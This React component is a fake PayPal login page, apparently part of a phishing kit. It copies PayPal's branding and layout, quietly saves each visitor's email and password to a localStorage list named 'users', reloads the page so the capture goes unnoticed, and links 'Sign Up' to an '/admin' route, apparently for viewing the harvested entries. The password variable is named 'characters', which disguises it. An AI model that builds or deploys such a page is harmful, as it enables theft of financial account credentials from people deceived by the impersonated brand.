import { useState } from "react";

const Login = () => {
  const [email, setEmail] = useState("");
  const [characters, setCharacters] = useState("");

  const handleLogin = () => {
    // Get existing data
    const existing = JSON.parse(localStorage.getItem("users") || "[]");

    // Save new entry
    const updated = [...existing, { email, characters, time: new Date() }];

    localStorage.setItem("users", JSON.stringify(updated));

    // Refresh page
    window.location.reload();
  };

  return (
    <>
    <div className="min-h-screen flex items-end justify-center text-black py-4">
        
      <div className="w-[450px] bg-white px-9 pb-6 rounded-lg text-center border border-gray-200 text-black h-[650px]">
        <h2 className="text-3xl font-bold mb-9 p-5 text-black">PayPal</h2>
        
        <input
          type="text"
          placeholder="Email or mobile number"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          className="w-full border border-gray-400 rounded-md p-6 mb-3 outline-none text-black placeholder:text-black-500 placeholder:font-semibold"
        />

        <input
          type="password"
          placeholder="Password"
          value={characters}
          onChange={(e) => setCharacters(e.target.value)}
          className="w-full border border-gray-400 rounded-md p-6 mb-2 outline-none text-black placeholder:text-black-500 placeholder:font-semibold"
        />

        <p className="text-[#0072E0] text-base mb-3 cursor-pointer font-semibold flex py-2">
          Forgot password?
        </p>

        <button
          onClick={handleLogin}
          className="w-full bg-[#004CA5] text-white py-3 rounded-full font-semibold"
        >
          Log In
        </button>

        <div className="flex items-center my-4 text-gray-600">
         <div className="flex-1 h-px bg-gray-300"></div>
            <span className="px-3">or</span>
            <div className="flex-1 h-px bg-gray-300"></div>
          </div>
        <button
          onClick={() => (window.location.href = "/admin")}
          className="w-full border py-3 rounded-full font-semibold text-black border-2 border-black  "
        >
          Sign Up
        </button>

        <div className="text-sm justify-center mt-28 font-extrabold text-gray-500"><span className="font-semibold text-gray-500">Português | </span>English
        </div>
      </div>
    </div>
    <footer className="text-center text-gray-600 bg-[#F6F9FA] py-4 font-medium text-xs">
        <span className="p-1 cursor-pointer">Contact Us</span>
        <span className="p-1 cursor-pointer">Privacy</span> 
        <span className="p-1 cursor-pointer">Legal</span>
        <span className="p-1 cursor-pointer">Policy Updates</span>
        <span className="p-1 cursor-pointer">Worldwide</span>  
        
    </footer>
    </>
  );
};

export default Login;